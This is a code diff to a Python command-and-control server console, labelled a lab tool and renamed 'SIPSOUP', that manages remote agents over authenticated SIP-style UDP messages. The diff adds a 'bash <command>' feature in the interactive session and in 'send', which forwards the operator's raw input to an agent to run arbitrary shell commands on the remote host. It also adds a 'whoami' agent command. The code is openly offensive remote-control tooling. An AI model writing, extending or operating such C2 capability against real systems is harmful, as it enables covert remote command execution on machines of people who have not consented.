@@ -9,7 +9,7 @@ import time
 from sip import build, parse
 
 ROOT_COMMANDS = ("help", "list", "interact", "send", "clear", "quit")
-AGENT_COMMANDS = ("ping", "info", "hostname", "user", "time", "disk")
+AGENT_COMMANDS = ("ping", "info", "hostname", "user", "whoami", "time", "disk")
 RESET = "\033[0m"
 BOLD = "\033[1m"
 DIM = "\033[2m"
@@ -21,7 +21,7 @@ GOLD = "\033[38;5;220m"
 
 
 def prompt(agent=None, safe=False):
-    name = f"{agent}" if agent else "COMMAND"
+    name = f"{agent}" if agent else "SIPSOUP"
     color = CYAN if agent else PURPLE
     if safe:
         color, end = f"\001{color}{BOLD}\002", f"\001{RESET}\002"
@@ -33,13 +33,13 @@ def prompt(agent=None, safe=False):
 def banner(bind, port):
     print("\033[2J\033[H", end="")
     print(f"""{PURPLE}{BOLD}
-   ███████╗██╗██████╗       ██████╗██████╗
-   ██╔════╝██║██╔══██╗     ██╔════╝╚════██╗
-   ███████╗██║██████╔╝     ██║      █████╔╝
-   ╚════██║██║██╔═══╝      ██║     ██╔═══╝
-   ███████║██║██║          ╚██████╗███████╗
-   ╚══════╝╚═╝╚═╝           ╚═════╝╚══════╝{RESET}
-   {DIM}Secure Interactive Protocol · Command Console{RESET}
+   ███████╗██╗██████╗ ███████╗ ██████╗ ██╗   ██╗██████╗
+   ██╔════╝██║██╔══██╗██╔════╝██╔═══██╗██║   ██║██╔══██╗
+   ███████╗██║██████╔╝███████╗██║   ██║██║   ██║██████╔╝
+   ╚════██║██║██╔═══╝ ╚════██║██║   ██║██║   ██║██╔═══╝
+   ███████║██║██║     ███████║╚██████╔╝╚██████╔╝██║
+   ╚══════╝╚═╝╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝{RESET}
+   {DIM}Secure Interactive Protocol · Souped-up Operator Utility Platform{RESET}
 
    {GREEN}● ONLINE{RESET}   {DIM}UDP{RESET} {bind}:{port}   {DIM}HMAC-SHA256 · anti-replay{RESET}
    {PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
@@ -48,7 +48,7 @@ def banner(bind, port):
 
 
 def show_help(agent=False):
-    rows = [(name, "Diagnostic distant") for name in AGENT_COMMANDS] + [("back", "Fermer la session")] if agent else [
+    rows = ([(name, "Diagnostic distant") for name in AGENT_COMMANDS] + [("bash <command>", "Exécuter une commande Bash"), ("back", "Fermer la session")]) if agent else [
         ("list", "Afficher les agents actifs"),
         ("interact <agent>", "Ouvrir une console interactive"),
         ("send <agent> <cmd>", "Envoyer une commande directe"),
@@ -90,10 +90,10 @@ def receive(sock, secret, agents, seen, state):
         try:
             data, address = sock.recvfrom(65535)
             method, target, sender, body = parse(data, secret, seen)
-            if method == "REGISTER" and target == "c2":
+            if method == "REGISTER" and target == "sipsoup":
                 agents[sender] = address
                 message = f"{GREEN}◆ LINK{RESET}  {BOLD}{sender}{RESET}  {DIM}{address[0]}:{address[1]}{RESET}"
-            elif method == "MESSAGE" and target == "c2":
+            elif method == "MESSAGE" and target == "sipsoup":
                 message = f"{CYAN}◀ RECV{RESET}  {BOLD}{sender}{RESET}  {body}"
             else:
                 continue
@@ -107,13 +107,13 @@ def receive(sock, secret, agents, seen, state):
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Serveur C2 SIP de laboratoire")
+    parser = argparse.ArgumentParser(description="Serveur SIPSOUP de laboratoire")
     parser.add_argument("--bind", default="127.0.0.1")
     parser.add_argument("--port", type=int, default=5060)
     args = parser.parse_args()
-    secret = os.environ.get("SIP_C2_SECRET")
+    secret = os.environ.get("SIPSOUP_SECRET") or os.environ.get("SIP_C2_SECRET")
     if not secret:
-        parser.error("SIP_C2_SECRET est requis")
+        parser.error("SIPSOUP_SECRET est requis")
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind((args.bind, args.port))
@@ -123,7 +123,8 @@ def main():
     threading.Thread(target=receive, args=(sock, secret, agents, seen, state), daemon=True).start()
     while True:
         try:
-            parts = shlex.split(input(prompt(state["agent"], safe=True)))
+            line = input(prompt(state["agent"], safe=True))
+            parts = shlex.split(line)
         except (EOFError, KeyboardInterrupt):
             print("\nAu revoir.")
             return
@@ -132,9 +133,9 @@ def main():
             print(f"{DIM}Session fermée.{RESET}")
         elif state["agent"] and parts == ["help"]:
             show_help(agent=True)
-        elif state["agent"] and len(parts) == 1 and parts[0] in AGENT_COMMANDS:
+        elif state["agent"] and ((len(parts) == 1 and parts[0] in AGENT_COMMANDS) or (len(parts) > 1 and parts[0] == "bash")):
             agent = state["agent"]
-            sock.sendto(build("MESSAGE", agent, "c2", parts[0], secret), agents[agent])
+            sock.sendto(build("MESSAGE", agent, "sipsoup", line, secret), agents[agent])
         elif state["agent"] and parts:
             print("Commande refusée. Tapez 'help' ou 'back'.")
         elif parts == ["list"]:
@@ -152,11 +153,11 @@ def main():
         elif parts in (["quit"], ["exit"]):
             print("Au revoir.")
             return
-        elif len(parts) == 3 and parts[0] == "send" and parts[2] in AGENT_COMMANDS:
+        elif parts[0:1] == ["send"] and ((len(parts) == 3 and parts[2] in AGENT_COMMANDS) or (len(parts) > 3 and parts[2] == "bash")):
             if parts[1] not in agents:
                 print(f"Agent inconnu: {parts[1]}")
             else:
-                sock.sendto(build("MESSAGE", parts[1], "c2", parts[2], secret), agents[parts[1]])
+                sock.sendto(build("MESSAGE", parts[1], "sipsoup", line.split(maxsplit=2)[2], secret), agents[parts[1]])
         elif parts:
             print("Commande inconnue. Tapez 'help'.")
 
